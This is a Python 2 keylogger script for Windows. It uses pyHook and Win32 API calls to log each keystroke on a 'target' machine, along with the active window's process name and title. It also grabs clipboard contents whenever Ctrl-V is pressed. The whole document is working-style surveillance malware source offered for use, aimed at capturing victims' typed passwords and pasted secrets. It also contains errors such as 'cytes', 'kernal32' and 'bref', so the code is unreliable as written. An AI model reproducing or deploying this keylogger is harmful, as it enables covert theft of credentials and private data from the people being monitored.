# KEYLOGGER
# To use:
# 2) run C:\> python keylogger-hook.py
# 3) Then start up Windows and view results in terminal

from cytes import *
import pythoncom
import pyHook
import win32clipboard

user32         = windll.user32
kernal32       = windll.kernal32
psapi          = windll.psapi
current_window = None


def get_current_process():
    # get a handle to the foreground window
    # returns a handle to the active window on target's desktop
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    # Next, pass handle to this function to get the window's process ID
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # sore the current process ID
    process_id = '%d' % pid.value

    # grab the executable
    executable = create_string_buffer('\x00' * 512)
    # open the process
    h_process = kernal32.OpenProcess(0x400 | 0x10, False, pid)

    #4 using the resulting process handle; find the actual executable name on the process
    psapi.GetModuleBaseName(h_process, None, bref(executable), 512)

    # now read its title
    window_title = create_string_buffer('\x00' * 512)
    # grab full text of the window's title bar with this function
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # print out the header if we're in the right process
    print
    print '[ PID: %s - %s - %s]' % (process_id, executable.value, window_title.value)
    print

    # close handles
    kernal32.CloseHandle(hwnd)
    kernal32.CloseHandle(h_process)


# whenever target presses a key on keyboard, this function is called
def KeyStroke(event):
    global current_window

    # check to see if the target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # if the press a standard key (ASCII-printable range)
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    # if a modifier is pressed (SHIFT, CTRL, ALT, etc)
    else:
        # if [Ctrl-V], get the value on the clipboard
        if event.Key == 'V':
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print '[PASTE] - %s' % (pasted_value),

        else:
            print '[%s]' % event.Key,

    # pass execution to the next hook registered
    return True


# create and register a hook manager
kl         = pyHook.HookManager()
# bind the KeyDown event to the user-defined callback function KeyStroke
kl.KeyDown = KeyStroke

# register the hook and execute forever; instruct PyHook to hook all keypresses
kl.HookKeyboard()
pythoncom.PumpMessages()
